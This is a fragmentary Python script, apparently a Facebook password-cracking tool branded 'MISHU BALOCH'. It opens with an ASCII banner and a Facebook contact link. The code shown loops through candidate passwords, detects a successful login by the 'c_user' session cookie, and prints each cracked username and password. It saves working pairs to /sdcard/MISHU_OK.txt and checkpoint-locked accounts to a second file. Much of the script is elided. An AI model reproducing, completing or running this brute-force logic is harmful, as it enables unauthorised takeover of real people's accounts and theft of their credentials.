...
........:::..:::::..::........:::.......::::......:::..:::::..:::::
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Facebook : facebook.com/Mishu baloch
...
def R():
			...
			print ("\033[1m [!] Tool    : MISHU BALOCH")

			print (" [!] Brand   : MISHU")

			print(" [!] Expired : enjoy")

			print (" [!] Status  : \033[1;92menjoy\033[1;97m")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Mishu-ok ] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/MISHU_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/mishu_CP.txt' , 'a').write('%s\n' % wrt)
